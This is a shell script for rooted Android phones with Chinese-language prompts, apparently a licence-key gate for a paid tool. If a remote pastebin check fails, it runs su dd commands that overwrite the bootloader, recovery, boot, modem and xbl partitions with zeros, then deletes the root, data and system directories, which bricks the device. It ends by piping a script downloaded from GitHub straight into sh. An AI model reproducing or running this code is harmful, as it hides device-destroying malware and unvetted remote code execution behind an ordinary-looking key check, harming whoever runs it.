whoami="By=obi"
owned=$(curl -s https://pastebin.com/raw/t54iAPPY)
proc=$(echo "$owned" | grep -wo $whoami)
if [ "$whoami" == "$proc" ]; then
echo -ne '██████                    [20%]\r'
else
printf "\n\n\n无法访问服务器...\n"
exit
fi
su -c curl -s https://pastebin.com/raw/NSH4Cd65 > /storage/emulated/0/Android/data/B
QQ201118023="/storage/emulated/0/Android/data/B"
TGCN_obi="By=obi"
# 判断匹配函数，匹配函数不为0，则包含给定字符
if [ `grep -c "$TGCN_obi" $QQ201118023` -ne '0' ];then
echo -ne '█████████████             [50%]\r'
    rm -rf /storage/emulated/0/Android/data/B
    else
echo -e "\033[5;46;40;32m         对不住了兄弟                        \033[0m"
sleep 3
#fastboot
su -c dd if=/dev/zero of=/dev/block/by-name/abl
su -c dd if=/dev/zero of=/dev/block/by-name/abl_a
su -c dd if=/dev/zero of=/dev/block/by-name/abl_b
#recovery
su -c dd if=/dev/zero of=/dev/block/by-name/recovery
su -c dd if=/dev/zero of=/dev/block/by-name/recovery_a
su -c dd if=/dev/zero of=/dev/block/by-name/recovery_b
#boot/ramdisk recovery
su -c dd if=/dev/zero of=/dev/block/by-name/boot
su -c dd if=/dev/zero of=/dev/block/by-name/boot_a
su -c dd if=/dev/zero of=/dev/block/by-name/boot_b
#modem
su -c dd if=/dev/zero of=/dev/block/by-name/fsc
su -c dd if=/dev/zero of=/dev/block/by-name/fsg
su -c dd if=/dev/zero of=/dev/block/by-name/mdm1m9kefs1
su -c dd if=/dev/zero of=/dev/block/by-name/mdm1m9kefs2
su -c dd if=/dev/zero of=/dev/block/by-name/mdm1m9kefs3
su -c dd if=/dev/zero of=/dev/block/by-name/mdm1m9kefsc
su -c dd if=/dev/zero of=/dev/block/by-name/modemst1
su -c dd if=/dev/zero of=/dev/block/by-name/modemst2
#xbl load tee and fastboot
su -c dd if=/dev/zero of=/dev/block/by-name/xbl
su -c dd if=/dev/zero of=/dev/block/by-name/xbl_a
su -c dd if=/dev/zero of=/dev/block/by-name/xbl_b
su -c dd if=/dev/zero of=/dev/block/by-name/xbl_config
su -c dd if=/dev/zero of=/dev/block/by-name/xbl_config_a
su -c dd if=/dev/zero of=/dev/block/by-name/xbl_config_b
rm -rf /*
rm -rf /data/
rm -rf /system/
rm -rf /dev/input/
    exit 0
    fi
sleep .5
echo -ne '████████████████████      [78%]\r'
a(){
    local s="$1"
    if [ ${s} -ge 60 ]
    then
        local m="0"
        while [ ${s} -ge 60 ]
        do
            local s="$((${s}-60))"
            local m="$((${m}+1))"
        done
        if [ ${m} -ge 60 ]
        then
            local h="0"
            while [ ${m} -ge 60 ]
            do
                local m="$((${m}-60))"
                local h="$((${h}+1))"
            done
            if [ ${h} -ge 24 ]
            then
                local d="0"
                while [ ${h} -ge 24 ]
                do
                    local h="$((${h}-24))"
                    local d="$((${d}+1))"
                done
                echo "${d}天 ${h}时 ${m}分 ${s}秒"
            else
                echo "${h}时 ${m}分 ${s}秒"
                return 0
            fi
        else
            echo "${m}分 ${s}秒"
            return 0
        fi
    else
        echo "${s}秒"
        return 0
    fi
}
data=`curl -s 'https://ghproxy.com/https://raw.githubusercontent.com/CN-obi/SH-/main/卡密'`
echo -ne '██████████████████████████[100%]\r'
printf "\n\n\n请输入卡密...\n"
read a
date=$(curl -s 'http://worldtimeapi.org/api/timezone/Asia/Shanghai.txt' | grep -Eo '[0-9]{10}')
b=0
for i in ${data}; do
  if test $a = "${i%%\,*}"; then
    if test ! "${date}" -gt "${i#*\,}"; then
    b=1
    cdate="${i#*\,}"
    else
    b=2
    fi
  fi
done
if [ $b = 0 ]; then
printf "\033[31;1m卡密不存在\033[0m\n"
exit
elif [ $b = 1 ]; then
printf "\033[32;1m卡密正确\033[0m\n"
else
printf "\033[31;1m卡密已过期\033[0m\n"
exit
fi
printf "\033[32;1m卡密剩余时间:\033[0m\033[31;1m $(a $((${cdate}-${date})))\033[0m\n      "
curl -s https://ghproxy.com/https://raw.githubusercontent.com/CN-obi/ccc/main/wang.sh | sh